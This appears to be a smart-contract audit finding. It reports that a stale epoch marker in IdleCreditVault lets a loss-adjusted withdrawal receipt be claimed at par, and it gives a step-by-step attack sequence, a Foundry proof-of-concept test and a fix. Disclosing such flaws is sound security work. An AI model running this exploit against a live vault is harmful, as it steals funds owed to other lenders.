### Title
Stale `lastWithdrawRequest` epoch marker lets a loss-adjusted receipt claim at par, overdrawing the IdleCreditVault - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`_claimLossAdjustedWithdrawRequest` decides whether a user's pending receipt belongs to a loss-adjusted epoch by reading `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`. But `lastWithdrawRequest` is overwritten on every new `requestWithdraw`, while `withdrawsRequests[_user]` accumulates receipts across epochs. A new request made after a loss-adjusted `stopEpochWithDuration` moves the marker to a clean epoch, so the older loss-epoch receipt bypasses the haircut and is paid at par through `_claimFundedWithdrawRequest`, even though the borrower only funded the reduced amount. This mirrors the kernel bug: a field repurposed for a second meaning (here, "epoch of last request" doubling as "epoch to look up the loss haircut") is consumed under the wrong meaning after being overwritten.

### Finding Description
- `requestWithdraw` in `IdleCreditVault` records `lastWithdrawRequest[_user] = currentEpoch` and accumulates `withdrawsRequests[_user] += _amount` plus `withdrawsRequestsByEpoch[_user][currentEpoch] += _amount`. [1](#0-0) 
- `claimWithdrawRequest` first calls `_claimLossAdjustedWithdrawRequest`, which computes `lossEpoch = lastWithdrawRequest[_user]` and reads `lossRecoveryPriceByEpoch[lossEpoch]`. If that entry is zero it returns 0 without clearing anything. [2](#0-1) 
- `_claimFundedWithdrawRequest` then pays the entire aggregate `withdrawsRequests[_user]` at par once `epochNumber > lastWithdrawRequest[_user]`. [3](#0-2) 
- When the manager calls `stopEpochWithDuration(..., _lossAmount)` on a running epoch, `previewLossAdjustedWithdrawFunds` reduces `_pendingWithdraws` so `collectWithdrawFunds` only pulls the loss-adjusted amount from the borrower, and `lossRecoveryPriceByEpoch[epochNumber]` (pre-increment) is set so that epoch's receipts claim at `claimBasis * lossRecoveryPrice / RECOVERY_FULL`. [4](#0-3) 

Attack sequence (fixed-APR mode, attacker = KYC'd lender):
1. Buffer epoch e1: attacker deposits AA and calls `cdoEpoch.requestWithdraw(amount, AAtranche)` → `withdrawsRequestsByEpoch[user][e1] = R1`, `lastWithdrawRequest[user] = e1`.
2. Epoch e1 runs; manager stops it with `stopEpochWithDuration(newApr, 0, newDur, R1 * 50%)`. Borrower funds only `R1 * lossRecoveryPrice / 1e18` for the pending bucket; `lossRecoveryPriceByEpoch[e1] = 0.5e18`; `epochNumber` becomes e1+1.
3. In the new buffer, attacker requests again → `lastWithdrawRequest[user] = e1+1`, `withdrawsRequests[user] = R1 + R2`, `withdrawsRequestsByEpoch[user][e1+1] = R2`.
4. Epoch e1+1 stops normally (`stopEpoch`); `epochNumber` = e1+2.
5. Attacker calls `claimWithdrawRequest`. `_claimLossAdjustedWithdrawRequest` reads `lossRecoveryPriceByEpoch[e1+1] == 0` and skips; `_claimFundedWithdrawRequest` passes the gate (`e1+2 > e1+1`) and transfers `R1 + R2` at par.

R1 was funded at 50% but paid at 100%: the extra `R1 * (1 - lossRecoveryPrice/1e18)` is paid from strategy underlyings belonging to other funded claimants and active depositors (the `defaultRecoveryReserve` guard in `_transferFundedClaim` only protects the post-default reserve, not this shortfall), causing direct insolvency for later claimants. [5](#0-4) 

### Impact Explanation
Direct theft / insolvency. Every loss-epoch receipt owned by an attacker who stacks a second request before claiming pays out at par instead of the loss-adjusted price. The deficit equals `claimBasis_lossEpoch * (1 - lossRecoveryPrice / RECOVERY_FULL)` per receipt and is borne by remaining claimants, whose funded withdrawals then revert on insufficient balance — permanent loss up to the unfunded haircut amount of the loss epoch.

### Likelihood Explanation
Requires a `stopEpochWithDuration` with `_lossAmount > 0` (an honest manager action when the borrower underpays) and the attacker holding or creating a second request afterward — cheap for any KYC'd lender. Per-epoch tracking exists via `withdrawsRequestsByEpoch`, but the claim path keys the loss lookup off the single mutable `lastWithdrawRequest` marker, so the precondition is trivially created by ordinary protocol use, no privileged collusion needed.

### Recommendation
Iterate over all epochs with nonzero `withdrawsRequestsByEpoch[_user]` (or store a per-epoch loss flag consulted in `_claimFundedWithdrawRequest`) so each epoch's receipt is cleared through `_clearWithdrawClaimForEpoch` with its own `lossRecoveryPriceByEpoch` price, rather than deriving the loss epoch from the mutable `lastWithdrawRequest` marker. Alternatively, reject new `requestWithdraw` calls while the user holds an unclaimed receipt from an epoch with a nonzero `lossRecoveryPriceByEpoch`.

### Proof of Concept
```solidity
// test/foundry/IdleCreditVault.staleLossEpoch.t.sol
function testLossEpochReceiptClaimsAtParAfterNewRequest() external {
    IdleCreditVault creditVault = IdleCreditVault(address(strategy));
    address attacker = makeAddr('attacker');

    // 1) attacker deposits and requests R1 in buffer of epoch 0
    _depositWithUser(attacker, 10_000 * ONE_SCALE, true);
    vm.prank(attacker);
    uint256 r1 = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // 2) epoch 0 runs and stops with a 50% loss on pending receipts
    _startEpochAndCheckPrices(0);
    uint256 owed = _expectedFundsEndEpoch();
    deal(defaultUnderlying, borrower, owed);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(initialProvidedApr, 0, 30 days, r1 / 2);
    // lossRecoveryPriceByEpoch[epochOf(r1)] = 0.5e18; strategy holds only r1/2 for r1

    // 3) attacker stacks a new request in the new buffer -> lastWithdrawRequest moves
    _depositWithUser(attacker, 10_000 * ONE_SCALE, true);
    vm.prank(attacker);
    uint256 r2 = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // 4) next epoch runs and stops cleanly
    _startEpochAndCheckPrices(1);
    deal(defaultUnderlying, borrower, _expectedFundsEndEpoch());
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(initialProvidedApr, 0);

    // 5) claim pays r1 + r2 at par; only r1*0.5 + r2 was funded -> shortfall
    uint256 balBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(attacker) - balBefore;

    assertEq(paid, r1 + r2, 'loss receipt paid at par');
    // funded bucket for epoch-0 receipts was r1 * lossRecoveryPrice / 1e18
    // the excess paid - (r1/2 + r2) is drained from other claimants' underlyings
    assertGt(paid, r1 / 2 + r2, 'overdrawn funded pool');
}
```

Note: I verified the claim-path reads (`lastWithdrawRequest` → `lossRecoveryPriceByEpoch` → par fallback) and the per-epoch request accounting, but I could not read `previewLossAdjustedWithdrawFunds`'s exact funding math or the exact line where `lossRecoveryPriceByEpoch` is written in this pass. If the loss-adjusted funding instead leaves full par backing in the strategy and relies on the haircut at claim time, the impact flips to the attacker permanently capturing the haircut amount — either way the stale-epoch lookup breaks the loss-waterfall invariant and should be confirmed against those two functions before reporting.

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L282-294)
```text
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L326-349)
```text
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L789-801)
```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L897-907)
```text
  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L393-410)
```text
    (_pendingWithdraws, _lossAmount) = _strategy.previewLossAdjustedWithdrawFunds(_lossAmount);

    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
```
